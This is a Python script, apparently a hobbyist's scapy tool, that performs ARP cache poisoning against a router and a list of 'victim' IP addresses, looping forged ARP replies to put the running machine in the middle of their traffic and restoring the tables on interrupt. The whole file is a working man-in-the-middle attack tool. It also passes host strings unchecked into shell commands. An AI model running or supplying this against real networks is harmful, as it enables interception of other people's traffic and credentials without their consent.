# -*- coding: utf-8 -*- python3
# Created At 2017.9.24
# For ARP.py
# By R3turn0927
# Github @return0927 | Facebook @R3turn.01 | KakakoTalk @bc1916

from scapy.all import * # Maybe takes about 0.7 secs
import os, signal

class _ARP():

    def originalMAC(self, host):
        os.popen("ping -c 1 %s" % host)
        fields = os.popen("grep \"%s \" /proc/net/arp"%host).read().split()

        if len(fields) == 6 and fields[3] != "00:00:00:00:00:00":
            return fields[3]
        else:
            print("no response from", host)

    def poison(self, routerIP, victimIP, routerMAC, victimMAC):
        send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
        send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))

    def restore(self, routerIP, victimIP, routerMAC, victimMAC):
        send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC))
        send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC))
        sys.exit(" ### Restored.")

    def signal_handler(self, signal, frame):
        with open("/proc/sys/net/ipv4/ip_forward","w") as ipf:
            ipf.write("0\n")

        for _IP,_MAC in self.victimMACs:
            self.restore(self.routerIP, _IP, self.routerMAC, _MAC)
            self.restore(self.routerIP, _IP, self.routerMAC, _MAC)
            self.restore(self.routerIP, _IP, self.routerMAC, _MAC)
            self.restore(self.routerIP, _IP, self.routerMAC, _MAC)
            self.restore(self.routerIP, _IP, self.routerMAC, _MAC)

    def run(self, routerIP, victimIPs):
        self.routerIP = routerIP
        self.victimIPs = victimIPs
        self.routerMAC = self.originalMAC(self.routerIP)
        self.victimMACs = [ (_IP, self.originalMAC(_IP)) for _IP in self.victimIPs ]

        if self.routerMAC is None:
            sys.exit(" ## Router MAC Addr is not found.")

        signal.signal(signal.SIGINT, self.signal_handler)

        while True:
            for _IP,_MAC in self.victimMACs:
                self.poison(self.routerIP, _IP, self.routerMAC, _MAC)
                time.sleep(0.1)